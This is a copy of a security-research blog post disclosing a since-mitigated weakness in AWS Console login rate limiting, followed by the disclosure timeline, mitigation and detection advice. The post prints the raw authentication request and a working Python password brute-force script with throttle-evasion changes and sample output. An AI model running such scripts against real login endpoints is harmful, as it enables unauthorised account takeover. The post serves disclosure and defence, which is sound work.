---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-06_discovering-a-weakness-leading-to-a-partial-bypass-of-the-login-rate-limiting-in.md
original_filename: 2023-02-06_discovering-a-weakness-leading-to-a-partial-bypass-of-the-login-rate-limiting-in.md
title: Discovering a weakness leading to a partial bypass of the login rate limiting
  in the AWS Console
category: documents
detected_topics:
- rate-limit
- mfa
- cloud-security
- oauth
- idor
- command-injection
tags:
- imported
- documents
- rate-limit
- mfa
- cloud-security
- oauth
- idor
- command-injection
language: en
raw_sha256: a856a77844293cc6000589be291e0fd0654dfe77dc0021a4c884bddbc80b896e
text_sha256: 47460df9d5f7d3ba2bf6f89401fcf4be20e44c2fc0405d381dec84dd6bd05aef
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: true
---

# Discovering a weakness leading to a partial bypass of the login rate limiting in the AWS Console

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-06_discovering-a-weakness-leading-to-a-partial-bypass-of-the-login-rate-limiting-in.md
- Source Type: markdown
- Detected Topics: rate-limit, mfa, cloud-security, oauth, idor, command-injection
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: True
- Raw SHA256: `a856a77844293cc6000589be291e0fd0654dfe77dc0021a4c884bddbc80b896e`
- Text SHA256: `47460df9d5f7d3ba2bf6f89401fcf4be20e44c2fc0405d381dec84dd6bd05aef`


## Content

---
title: "Discovering a weakness leading to a partial bypass of the login rate limiting in the AWS Console"
page_title: "Discovering a weakness leading to a partial bypass of the login rate limiting in the AWS Console | Datadog Security Labs"
url: "https://securitylabs.datadoghq.com/articles/aws-console-rate-limit-bypass/"
final_url: "https://securitylabs.datadoghq.com/articles/aws-console-rate-limit-bypass/"
authors: ["Christophe Tafani-Dereeper (@christophetd)"]
programs: ["AWS"]
bugs: ["Rate limiting bypass", "Bruteforce"]
publication_date: "2023-02-06"
added_date: "2023-02-13"
source: "pentester.land/writeups.json"
original_index: 1571
---

on this page

  * Authenticating to the AWS Console with an IAM user
  * Brute-forcing the authentication endpoint
  * Impact
  * Mitigation and root cause
  * Disclosure timeline
  * Notes on prevention and detection
  * Acknowledgements

[ ![Christophe Tafani-Dereeper](https://imgix.datadoghq.com/img/blog/_authors/tafani-dereeper_christophe2.jpeg?auto=format&w=48&h=48&dpr=2&q=75) Christophe Tafani-Dereeper Cloud Security Researcher and Advocate ](/articles/?author=Christophe_Tafani-Dereeper)

AWS applies a rate limit to authentication requests made to the [AWS Console](https://aws.amazon.com/console/), in an effort to prevent brute-force and credential stuffing attacks. In this post, we discuss a weakness we discovered in the AWS Console authentication flow that allowed us to partially bypass this rate limit and continuously attempt more than 280 passwords per minute (4.6 per second). The weakness was since mitigated by AWS.

The issue discussed in this post had an impact only on IAM users that did not have multi-factor authentication (MFA), since discovering a valid password without access to the second factor wouldn't have allowed an attacker to take over an IAM user account.

## Authenticating to the AWS Console with an IAM user

A common method for authenticating to the AWS Console as an IAM user is to browse to `console.aws.amazon.com`, which redirects to `signin.aws.amazon.com` for authentication. Then, we can select “IAM user” and enter our AWS account ID.

![Logging in to the AWS Console](https://securitylabs.dd-static.net/img/aws-console-rate-limit-bypass/console-login.png?auto=format&w=896&dpr=1.75)

We are then prompted for our IAM username and password.

![Logging in to the AWS Console](https://securitylabs.dd-static.net/img/aws-console-rate-limit-bypass/console-login-2.png?auto=format&w=896&dpr=1.75)

When the form is submitted, a POST request is sent to `signin.aws.amazon.com/authenticate`. If we remove the extraneous parameters and cookies, the HTTP request looks as follows (line feeds in the request body added for clarity):
  
  
  POST /authenticate HTTP/2
  Host: signin.aws.amazon.com
  Content-Length: 257
  Content-Type: application/x-www-form-urlencoded
  Origin: https://signin.aws.amazon.com
  
  action=iam-user-authentication
  &account=884527801452
  &username=christophe
  &password=***REDACTED***
  &client_id=arn%3Aaws%3Asignin%3A%3A%3Aconsole%2Fcanvas
  &redirect_uri=https%3A%2F%2Fus-east-1.console.aws.amazon.com%2Fconsole

If the username or password is invalid, we get the following response, along with an HTTP 200 status code:
  
  
  {
  "state": "FAIL",
  "properties": {
  "result": "FAILURE",
  "text": "Your authentication information is incorrect. Please try again."
  }
  }

If the password is valid and the user does not have multi-factor authentication enforced, the response is:
  
  
  {
  "state": "SUCCESS",
  "properties": {
  "result": "SUCCESS",
  "redirectUrl": "https://us-east-1.console.aws.amazon.com/console?code\u003<token>"
  }
  }

## Brute-forcing the authentication endpoint

This authentication endpoint (like all authentication endpoints) is a natural target for attackers, who often attempt brute-force or credential stuffing attacks to force their way into AWS environments. Let’s automate this type of attack attempt and see how the backend behaves, as well if there is any kind of rate limiting.
  
  
  #!/usr/bin/python3
  import argparse
  
  import requests
  
  requests.urllib3.disable_warnings()
  
  parser = argparse.ArgumentParser()
  parser.add_argument('--account-id', '-id', required=True, default=False, metavar='account_id', type=str)
  parser.add_argument('--username', '-u', required=True, default=False, metavar='username', type=str)
  parser.add_argument('--wordlist', '-w', required=True, default=False, metavar='file_path', type=str)
  args = parser.parse_args()
  
  passwords = open(args.wordlist).read().splitlines()
  
  for password in passwords:
  data = {
  'action': 'iam-user-authentication',
  'client_id': 'arn:aws:signin:::console/canvas',
  'redirect_uri': 'https://console.aws.amazon.com/console/home',
  'account': args.account_id,
  'username': args.username,
  'password': password
  }
  response = requests.post('https://signin.aws.amazon.com/authenticate', data=data)
  if 'SUCCESS' in response.text:
  # We found the password
  print("="*20)
  print("Found password for " + username + ": " + password)
  print("="*20)
  exit(0)
  else:
  print("Failed attempt for password " + password + ": '" + response.json()['properties']['text'] + "'")

We run this script on a wordlist from [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials):
  
  
  python bruteforce.py \
  --account-id "884527801452" \
  --username "christophe" \
  --wordlist "500-worst-passwords.txt"
  
  
  Failed attempt for password 123456: 'Your authentication information is incorrect. Please try again.'
  Failed attempt for password password=***REDACTED*** authentication information is incorrect. Please try again.'
  Failed attempt for password 12345678: 'Your authentication information is incorrect. Please try again.'
  ...
  Failed attempt for password batman: 'Too many invalid passwords have been used to attempt to sign-in to this account.  Please wait 4 seconds before your next attempt.'

We can see that the rate limiting mechanism kicks in after we submit 30 invalid passwords within a short amount of time and asks us to wait for four seconds before trying again. Let’s slightly modify our code to honor the demand:
  
  
  if 'SUCCESS' in response.text:
  # We found the password
  
  elif 'wait' in response.text:
  print("Sleeping")
  time.sleep(5)
  
  # Requeue the password
  passwords.append(password)
  
  elif 'FAILURE' in response.text:
  # Failed attempt

Interestingly, pausing for five seconds allows us to send 30 more authentication attempts, and we can repeat this process. This enables us to indefinitely attempt around 100 passwords per minute. But can we do even better?

As you might have noticed, our brute-forcing script is pretty basic and sends HTTP requests sequentially. This is highly inefficient, as most of the execution time is blocked waiting for I/O. Let’s modify our script to work as follows:

  * Create 30 threads, each of them responsible to try one candidate password.
  * Run the 30 threads in parallel.
  * Pause for 5 seconds to avoid triggering the rate limiting mechanism.

See the full code [here](https://gist.github.com/christophetd/6cedf145e5a4ff1ba144747b734c114a). Let’s test it and see the output:
  
  
  Trying 500 passwords at a max rate of 30 passwords every 6 seconds
  
  6.0 % done (30/500) passwords tried, estimated 1m44s remaining
  12.0 % done (60/500) passwords tried, estimated 1m36s remaining
  18.0 % done (90/500) passwords tried, estimated 1m32s remaining
  24.0 % done (120/500) passwords tried, estimated 1m23s remaining
  ...
  90.2 % done (450/500) passwords tried, estimated 10s remaining
  96.2 % done (480/500) passwords tried, estimated 4s remaining
  
  ====================
  Found password for christophetd: rush2112
  ====================

The script took 1 minute and 47 seconds to execute and was able to try 500 passwords, which means we were able to continuously try more than 280 passwords per minute (4.6 per second) without being blocked by the rate limiting mechanism.

## Impact

Attackers value the ability to efficiently attempt common or breached passwords. Even though they need a target username to gain entry, there are known methods to [enumerate valid IAM users in an AWS account](https://hackingthe.cloud/aws/enumeration/enum_iam_user_role/), without having any access to the account.

## Mitigation and root cause

Following our report to the AWS Security Team, AWS rolled out a more aggressive rate limiting mechanism. While we don’t have the details of the updated algorithm, it seems to be much more effective at blocking brute-force attacks. In particular (though this is purely conjecture), it seems to consider authentication attempts within a larger time window and appears to add more aggressive throttling that blocks bursts in traffic.

As the AWS team pointed out, rate limiting can be tricky to tune as it needs to be efficient enough to block brute-force and credential stuffing attacks, while not creating a denial of service condition for legitimate users.

## Disclosure timeline

  * December 7, 2022: Datadog Security Labs reports the issue to AWS Security.
  * December 8, 2022: AWS Security acknowledges the report.
  * December 13, 2022: AWS Security confirms they are working on a mitigation.
  * December 21, 2022: AWS Security confirms the mitigation is being rolled out.
  * January 26, 2023: AWS Security confirms the mitigation has been globally rolled out.

## Notes on prevention and detection

Independent of the rate limiting mechanism implemented by AWS, the best protection against password stuffing and brute-force attacks is multi-factor authentication, along with strong passwords.

In addition to these best practices, you can [detect potential brute-force behavior using the CloudTrail `ConsoleLogin` event](https://docs.datadoghq.com/security/default_rules/8d2-d0c-0b6). See also Stratus Red Team’s [Console Login Without MFA](https://stratus-red-team.cloud/attack-techniques/AWS/aws.initial-access.console-login-without-mfa/) attack technique to easily reproduce this type of attacker behavior.

For instance, the following CloudTrail event shows that a successful console login was performed for the IAM user `vulnerable`, without using MFA.
  
  
  {
  "userIdentity": {
  "session_name": "vulnerable",
  "type": "IAMUser",
  "arn": "arn:aws:iam::123456789123:user/vulnerable",
  "accountId": "123456789123",
  "userName": "vulnerable"
  },
  "eventSource": "signin.amazonaws.com",
  "eventType": "AwsConsoleSignIn",
  "eventCategory": "Management",
  "awsRegion": "us-east-1",
  "eventName": "ConsoleLogin",
  "readOnly": false,
  "eventTime": "2023-02-06T12:00:00Z",
  "managementEvent": true,
  "additionalEventData": {
  "MFAUsed": "No",
  "LoginTo": "https://console.aws.amazon.com/console/home",
  "MobileVersion": "No"
  },
  "responseElements": {
  "ConsoleLogin": "Success"
  }
  }

For a higher signal-to-noise ratio, you can also create a detection that identifies when multiple authentication failures happen before a successful one for a specific user.

## Acknowledgements

Thank you to Nick Frichette, Adam Stevko, and [Rami McCarthy](https://ramimac.me/) for reviewing this post, and to [Thanabodi Phrakhun](https://www.linkedin.com/in/naikordian) ([@naikordian](https://github.com/naikordian)) for the [inspiration](https://naikordian.github.io/blog/posts/brute-force-aws-console/).

  * [ twitter ](https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Faws-console-rate-limit-bypass%2F&text=Discovering%20a%20weakness%20leading%20to%20a%20partial%20bypass%20of%20the%20login%20rate%20limiting%20in%20the%20AWS%20Console "twitter")
  * [ reddit ](https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Faws-console-rate-limit-bypass%2F "reddit")

##  Did you find this article helpful?
